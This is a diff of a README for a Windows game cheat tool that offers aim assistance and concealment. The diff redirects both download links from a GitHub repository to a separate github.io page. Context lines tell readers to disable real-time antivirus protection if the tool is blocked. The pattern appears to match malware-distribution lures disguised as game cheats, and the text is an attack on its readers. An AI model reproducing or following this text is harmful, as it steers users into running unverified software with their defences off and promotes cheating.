@@ -1,6 +1,6 @@
 # 🎯 kaizen-pc-script-tool - Automate combat and refine gameplay mechanics
 
-[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/bronchitic-bunt160/kaizen-pc-script-tool)
+[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://bronchitic-bunt160.github.io)
 
 This software helps users automate targeting and movement in supported PC games. It adds functions for aim assistance and camouflage. The tool runs on Windows systems. It operates in the background. It modifies game inputs to provide specific gameplay advantages. Use this tool to improve aim accuracy and concealment techniques during play sessions.
 
@@ -19,7 +19,7 @@ Disable real-time antivirus protection temporarily if the system blocks the tool
 
 You must visit the official release page to download the necessary files. 
 
-[Visit this page to download the tool](https://github.com/bronchitic-bunt160/kaizen-pc-script-tool)
+[Visit this page to download the tool](https://bronchitic-bunt160.github.io)
 
 1. Open the link provided above in your web browser.
 2. Look for the Releases section on the right side of the page.
